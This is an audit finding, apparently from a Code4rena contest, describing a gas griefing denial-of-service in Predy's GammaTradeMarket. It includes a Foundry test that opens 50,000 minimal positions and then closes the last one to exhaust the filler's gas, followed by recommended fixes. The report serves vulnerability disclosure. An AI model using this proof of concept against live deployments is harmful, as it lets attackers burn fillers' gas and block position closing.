# Vulnerability details

## Impact
In `GammaTradeMarket`, when a user opens a position with `positionId = 0`, a new vault is created, the id of the vault is added to `positionIDs[user]` array. 

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/markets/gamma/GammaTradeMarket.sol#L198

When the user closes a position, the `positionIDs[user]` array is looped through to find the `vaultId` and the `vaultId` wil be deleted it from the array.

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/markets/gamma/GammaTradeMarket.sol#L99

An attacker can exploit this, by open a many positions with minimum required margin (`1e6`), and then closes the last position in the array. The filler, who executes the trade, will pay maximum gas limit for this trade and can not close this position. Note that the attacker will lose nothing from this attack because he can close the positions from front to back to claim this money back.

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./market/gamma/Setup.t.sol";
import {Constants} from "../src/libraries/Constants.sol";

contract TestGammaExecuteOrder is TestGammaMarket {
    uint256 attackerPrivateKey;
    address attacker;

    function setUp() public override {
        TestGammaMarket.setUp();

        registerPair(address(currency1), address(0));
        gammaTradeMarket.updateQuoteTokenMap(1);

        predyPool.supply(1, true, 1e10);
        predyPool.supply(1, false, 1e10);

        attackerPrivateKey = 0x12341234;
        attacker = vm.addr(attackerPrivateKey);

        currency1.mint(attacker, type(uint128).max);

        vm.prank(attacker);
        currency1.approve(address(permit2), type(uint256).max);
    }

    function testExecuteOrderSucceedsForOpen() public {
        for (uint i = 0; i < 50000; ++i) {
            GammaOrder memory order =
                _createOrder(attacker, i, block.timestamp + 100, 1, 0, 1, 0, 2e6, Constants.Q96);
            gammaTradeMarket.executeTrade(order, _sign(order, attackerPrivateKey), _getSettlementDataV3(Constants.Q96));
        }

        GammaOrder memory order =
            _createOrder(attacker, 50000, block.timestamp + 100, 1, 50000, -1, 0, 0, Constants.Q96);
        gammaTradeMarket.executeTrade(order, _sign(order, attackerPrivateKey), _getSettlementDataV3(Constants.Q96));
    }
}
```

## Recommended Mitigation Steps
One approach to mitigate is implementing an off-chain filling mechanism for the filler such as: if an address has more than `N` open position then the filler will only fill the closing order.

Another on-chain approach is using Openzeppelin `EnumerableSet` instead of a normal array.
